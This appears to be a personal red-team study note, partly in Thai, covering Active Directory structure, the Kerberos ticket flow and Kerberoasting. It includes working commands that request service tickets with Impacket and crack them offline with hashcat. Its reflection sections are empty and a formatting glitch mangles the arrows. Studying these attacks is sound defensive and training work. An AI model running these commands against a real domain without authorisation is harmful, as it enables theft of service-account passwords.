# 🏰 Active Directory Architecture & Exploitation Tradecraft

> **Phase:** `Phase F — Red Teaming & Active Directory` | **Tags:** `#active-directory` `#redteam` `#kerberos` `#ad-attacks`  
> **Status:** ⏳ Upcoming | **Focus:** Windows Domain Controller, Kerberos Authentication, Kerberoasting & GPO

---

## 📑 Core Modules Overview

- [ ] [[#Module 01: Windows Domain & AD DS Architecture|Module 01: Windows Domain & AD DS Architecture]]
- [ ] [[#Module 02: Kerberos Protocol & Authentication Flow|Module 02: Kerberos Protocol & Authentication Flow]]
- [ ] [[#Module 03: Kerberoasting Attack Methodology|Module 03: Kerberoasting Attack Methodology]]

---

## Module 01: Windows Domain & AD DS Architecture
- **Status:** ⏳ Not Started
- **Core Concept:** 90% ขององค์กรทั่วโลกบริหารจัดการสิทธิ์ผู้ใช้ผ่าน Active Directory: Domain Controller (DC), Forests, Domains, Organizational Units (OUs), Group Policies (GPOs)

---

## Module 02: Kerberos Protocol & Authentication Flow
- **Status:** ⏳ Not Started
- **Core Concept:** กลไกตั๋ว Kerberos:
  1. `AS-REQ` $ightarrow$ ขอตั๋ว TGT จาก Key Distribution Center (KDC)
  2. `AS-REP` $ightarrow$ KDC ส่ง Ticket Granting Ticket (TGT) กลับมา
  3. `TGS-REQ` $ightarrow$ ส่ง TGT ไปขอ Ticket สำหรับ Service เฉพาะ (TGS)
  4. `TGS-REP` $ightarrow$ KDC ส่ง TGS ที่เข้ารหัสด้วย Password Hash ของ Service Account นั้น
  5. `AP-REQ` $ightarrow$ นำ TGS ไปยื่นต่อ Service เพื่อเข้าใช้งาน

---

## Module 03: Kerberoasting Attack Methodology
- **Status:** ⏳ Not Started
- **Core Concept:** สมาชิก Domain ทุกคนสามารถขอตั๋ว TGS สำหรับ Service Principal Name (SPN) ใดก็ได้ จากนั้นนำตั๋ว TGS ออกมาแคร็กรหัสผ่านแบบ Offline โดยที่ Domain Controller ตรวจจับแทบไม่ได้

### 💻 Kerberoasting Attack Flow
```bash
# 1. ใช้ Impacket สแกนหา SPN และขอตั๋ว TGS มาเก็บไว้ในไฟล์
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.200 -request -outputfile kerberoast_hashes.txt

# 2. นำไฟล์ตั๋วมาแคร็กด้วย Hashcat Mode 13100 (Kerberos 5 TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
